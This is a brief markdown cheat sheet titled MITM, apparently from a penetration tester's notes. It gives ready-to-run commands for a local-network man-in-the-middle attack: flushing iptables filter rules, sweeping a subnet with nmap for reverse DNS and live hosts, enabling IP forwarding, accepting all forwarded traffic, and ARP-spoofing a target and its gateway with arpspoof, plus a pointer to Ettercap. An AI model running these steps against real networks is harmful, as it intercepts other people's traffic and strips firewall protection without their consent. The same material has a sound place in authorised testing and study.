# MITM

### flush iptables

```
sudo iptables -t filter -F
```

### reverse dns

```
nmap -sL 192.168.1.0/24 2>&1 | tee | grep --line-buffered -e \( | awk -Ffor '{print $2}'
```

### get alive hosts

```bash
nmap -sn 192.168.1.68
# if ping is blocked
nmap -Pn 192.168.1.68
```

### MITM

```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t filter -A FORWARD -j ACCEPT
# sudo arpspoof -i eth0 -t 192.168.1.90 -r 192.168.1.1
sudo arpspoof -i eth0 -t <target> -r <gateway>
```

### or just use Ettercap

{% embed url="https://www.ettercap-project.org" %}

